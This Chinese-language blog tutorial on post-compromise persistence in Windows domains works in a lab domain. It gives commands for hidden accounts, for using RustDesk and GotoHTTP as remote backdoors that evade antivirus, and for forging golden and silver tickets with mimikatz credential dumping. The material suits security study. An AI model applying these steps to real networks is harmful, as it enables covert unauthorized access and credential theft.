@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网权限维持(二)-隐藏账户&RustDesk&GotoHTTP&黄金白银票据</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-11-04 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网权限维持-二-隐藏账户-amp-RustDesk-amp-GotoHTTP-amp-黄金白银票据"><a href="#内网权限维持-二-隐藏账户-amp-RustDesk-amp-GotoHTTP-amp-黄金白银票据" class="headerlink" title="内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据"></a>内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据</h1><h2 id="基于用户-隐藏用户"><a href="#基于用户-隐藏用户" class="headerlink" title="基于用户-隐藏用户"></a>基于用户-隐藏用户</h2><p><a target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p>
+<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_upx_v0.<span class="number">2</span> <span class="literal">-u</span> test <span class="literal">-p</span> Test!<span class="selector-tag">@</span><span class="comment">#45</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667524435579-52f23fb8-5d51-431e-9ea5-650a63e45ba1.png" alt="image.png"><br>添加完成后再cmd查看当前用户<br><img src="/posts/a5dc2208/1667524473307-26889a1f-224a-471b-bfc6-68279a9e3a0d.png" alt="image.png"><br>并没有发现新用户<br>但是再控制面板中可以发现创建的用户<br><img src="/posts/a5dc2208/1667524509820-bb5f8573-835d-4315-866b-47759c9f063c.png" alt="image.png"><br>右键删除可以直接删除<br>该工具也可以用来查找当前环境下的隐藏用户</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_upx_v0.<span class="number">2</span> <span class="literal">-c</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667524737163-5c63092a-db01-43d7-9ddc-7b015f7c559e.png" alt="image.png"></p>
+<h3 id="单机版"><a href="#单机版" class="headerlink" title="单机版"></a>单机版</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount_upx_v0.<span class="number">2</span> <span class="literal">-u</span> test <span class="literal">-p</span> Test!<span class="selector-tag">@</span><span class="comment">#45</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667525872698-0415f258-7c02-4867-8e32-8355084e36cf.png" alt="image.png"><br>依旧可以创建成功<br><img src="/posts/a5dc2208/1667525893506-291548a0-084f-4f98-9bdb-ba9b40f2c2b2.png" alt="image.png"><br>命令行也无法查看<br><img src="/posts/a5dc2208/1667525949300-e5669d5b-39c3-4eba-bb30-bae493a924a3.png" alt="image.png"><br>同样在控制面板中也可以看到<br>但是右键删除不能删掉<br><img src="/posts/a5dc2208/1667525994595-d62f66f0-6a7b-4477-a751-20e0292e3222.png" alt="image.png"><br><strong>原因:</strong><br>右键用户属性可以看到该用户不属于任何组<br><img src="/posts/a5dc2208/1667526058767-ee1f4e93-a807-4422-86bc-de71f935a3ca.png" alt="image.png"><br>通过命令手动添加隐藏用户</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test123<span class="variable">$</span> test123 /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667526339122-ec472be0-d302-4193-8816-5def3e52685b.png" alt="image.png"><br>可以看到手工添加的用户是存在组的，右键也可以直接删除<br>**总结:**该隐藏用户控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除</p>
+<h2 id="基于软件-GotoHTTP-amp-RustDesk"><a href="#基于软件-GotoHTTP-amp-RustDesk" class="headerlink" title="基于软件-GotoHTTP&amp;RustDesk"></a>基于软件-GotoHTTP&amp;RustDesk</h2><p><strong>为什么利用这些软件?</strong><br>这些软件利用内网穿透可以绕过协议的封禁,同时这些软件在杀毒软件里为白名单，同时支持静默安装</p>
+<h3 id="GotoHTTP"><a href="#GotoHTTP" class="headerlink" title="GotoHTTP"></a>GotoHTTP</h3><p><a target="_blank" rel="noopener" href="https://gotohttp.com/goto/download.12x">https://gotohttp.com/goto/download.12x</a><br><strong>利用场景</strong>：有网络下，需要绕过杀毒等网络防护<br>B2C模式，无需安装控制端软件，有浏览器就可以远控。<br>流量走https协议，只要目标放行443端口出口就可以实现内网穿透。<br>在低带宽也可以使用，运行占用内存极低，控制时占用CPU仅为0%-3%。<br>被控端在类Linux系统上支持图形界面（GUI）和字符界面（CLI）<br>网络唤醒远程主机需加载驱动，导致运行时安全卫士会拦截这行为，其他杀软不会拦截。<br>启动软件后会自动生成id和控制码<br><img src="/posts/a5dc2208/1667528215045-7b6f6ae6-f9cb-4e2f-beed-f2cced707e53.png" alt="image.png"><br>实战中没有图形化如何获得id和控制码呢？<br>id生成后会在当前文件夹生成两个文件<br><img src="/posts/a5dc2208/1667528316523-a7709c2d-42ff-4e39-bf63-2fa34c64e37b.png" alt="image.png"><br>其中<code>gotohttp.ini</code>就是存储的id值和密码通过命令行读取即可<br><img src="/posts/a5dc2208/1667528381379-949e769a-a480-4c2f-b6cc-6c8c3f5fccbb.png" alt="image.png"><br>得到id值到:<a target="_blank" rel="noopener" href="http://gotohttp.com/">http://gotohttp.com/</a> 登录即可<br><img src="/posts/a5dc2208/1667528470494-a4e8cff4-462b-4085-85cc-8370604062aa.png" alt="image.png"></p>
+<h3 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h3><p><a target="_blank" rel="noopener" href="https://github.com/rustdesk/rustdesk">https://github.com/rustdesk/rustdesk</a><br>利用场景：无需网络，需要绕过杀毒等网络防护</p>
+<h4 id="1、有网连接"><a href="#1、有网连接" class="headerlink" title="1、有网连接"></a>1、有网连接</h4><p>直接运行软件<br>配置文件位置<code>C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml</code><br><img src="/posts/a5dc2208/1667530174725-59e35cf1-c8ac-4550-b12c-caf0babbca87.png" alt="image.png"><br>直接连接即可<br><img src="/posts/a5dc2208/1667531219983-4e54517e-8600-45a0-a1fb-427e1f5bf13a.png" alt="image.png"></p>
+<h4 id="2、无网内网连接"><a href="#2、无网内网连接" class="headerlink" title="2、无网内网连接"></a>2、无网内网连接</h4><p>修改<code>RustDesk2.toml</code>文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">direct<span class="literal">-server</span> = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">direct<span class="literal">-access-port</span> = <span class="string">&#x27;8443&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667531451765-d2820289-ef6c-4209-b6e1-c5e97cd18d17.png" alt="image.png"><br>然后利用同网段主机进行连接<br><img src="/posts/a5dc2208/1667531789477-cbc2907d-6353-4644-acc3-c3c146eb5906.png" alt="image.png"><br>密码依旧是在<code>RustDesk.toml</code>下<br><img src="/posts/a5dc2208/1667531831333-28d504b6-2997-4b5a-a2a5-5f21b396ebb3.png" alt="image.png"></p>
+<h2 id="基于服务TGT-黄金白银票据"><a href="#基于服务TGT-黄金白银票据" class="headerlink" title="基于服务TGT-黄金白银票据"></a>基于服务TGT-黄金白银票据</h2><p><a target="_blank" rel="noopener" href="https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</a></p>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>⻩⾦票据⽣成攻击，是⽣成有效的TGT Kerberos票据，并且不受TGT⽣命周期的影响（TGT默认10⼩时，最多续订7天），这⾥可以为任意⽤户⽣成⻩⾦票据，然后为域管理员⽣成TGT，这样普通⽤户就可以变成域管理员。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、已经拿下域管理员，获取到krbtgt hash；<br>2、利用krbtgt的hash制作黄金票据工具，进行攻击。</p>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1、获取域名<br><img src="/posts/a5dc2208/1667532830396-7f856bbe-f343-4767-b565-87d7ebb95bf3.png" alt="image.png"><br>2、获取域的SID值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667532924559-ba0c1151-1b87-4dd0-9a5f-5cf6a57aab53.png" alt="image.png"><br>不需要后四位<br>3、获取域的KRBTGT账户</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mimikatz 需要用域管账户获取</span></span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667535955270-a9312f61-e94f-4460-b183-732f3dfbb9c2.png" alt="image.png"><br>4、伪造用户名：webadmin（任意用户名）<br>生成票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mimkatz</span></span><br><span class="line">kerberos::golden /user:webadmin /domain:god.org /sid:S<span class="literal">-1-5-21-1218902331-2157346161-1782232778</span> /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667536010200-fad90b02-95c9-4e65-92d1-796f188908b5.png" alt="image.png"><br>导入内存</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt g</span><br></pre></td></tr></table></figure>
+
+<p>访问测试：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\owa2010cn<span class="literal">-god</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667536098971-7e2ca117-5821-4ec0-99b1-9f084d49f865.png" alt="image.png"><br>黄金票据总结：<br>该攻击⽅式其实是⼀种后⻔的形式，属于第⼆次进⾏攻击的⽅法。<br>第⼀次拿到域管权限之后，需要将krbtgt NTLM hash进⾏保存，当第⼆次再来进⾏域渗透攻击时，我们就可使⽤krbtgt的NTLM hash制作⻩⾦票据，从⽽再次获得域管权限。</p>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据（SILVER TICKET）是利用域的服务账户进行伪造的ST，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后，通过自己的Master Key 解密ST，从而获得 Session Key。所以只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用（不需要交互KDC，需要知道Server的NTLM Hash）。</p>
+<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、已经拿下域管理员，获取到DC hash；<br>2、利用DC的hash制作白银票据工具，进行攻击。</p>
+<h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h4><p>1、获取域名</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667536605598-8d639962-0737-43ba-9301-e8545fcc0e8e.png" alt="image.png"><br>2、获取域的SID值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p>3、获取目标主机账户NTLM-HASH：82779569ef27d72b88b6c93dd8b37299</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>4、伪造用户名：webadmin（任意用户名）<br>导入票据：（CIFS文件共享服务）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">domain：域名</span><br><span class="line">sid：域环境下的SID，除去最后-的部分剩下的内容</span><br><span class="line">target：要访问的服务器，写FQDN</span><br><span class="line">rc4：写的是目标主机的NTLM（主机名<span class="variable">$</span>对应NTLM）</span><br><span class="line">service：要访问的资源类型</span><br><span class="line">user：伪造的用户</span><br><span class="line">cifs：共享文件</span><br><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:webadmin /domain:god.org /sid:S<span class="literal">-1-5-21-1218902331-2157346161-1782232778</span> /target:owa2010cn<span class="literal">-god</span>.god.org /service:cifs /rc4:d7ff309bdcb4ea181a2b00540e1cd173 /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667538062205-0cd8b355-5f35-4d2e-819a-4a12f7d1f65b.png" alt="image.png"><br>查看当前票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667538141770-3b003d66-70a5-4476-8456-72e62fb8b136.png" alt="image.png"><br>通讯测试</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\owa2010cn<span class="literal">-god</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a5dc2208/1667538108035-b81f127f-6c5b-47bc-8b6a-9750058518c7.png" alt="image.png"><br>白银票据总结<br>1、伪造的ST，只能访问指定的服务，如CIFS；<br>2、不与KDC交互，直接访问Server；<br>3、ST由服务账号 NTLM Hash 加密。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/b140a792/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-11-04 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E4%BA%8C-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7-amp-RustDesk-amp-GotoHTTP-amp-%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">内网权限维持(二)-隐藏账户&amp;RustDesk&amp;GotoHTTP&amp;黄金白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%94%A8%E6%88%B7-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-text">基于用户-隐藏用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-text">域环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E6%9C%BA%E7%89%88"><span class="toc-text">单机版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%BD%AF%E4%BB%B6-GotoHTTP-amp-RustDesk"><span class="toc-text">基于软件-GotoHTTP&amp;RustDesk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GotoHTTP"><span class="toc-text">GotoHTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RustDesk"><span class="toc-text">RustDesk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%9C%89%E7%BD%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">1、有网连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%97%A0%E7%BD%91%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">2、无网内网连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1TGT-%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">基于服务TGT-黄金白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-1"><span class="toc-text">流程</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
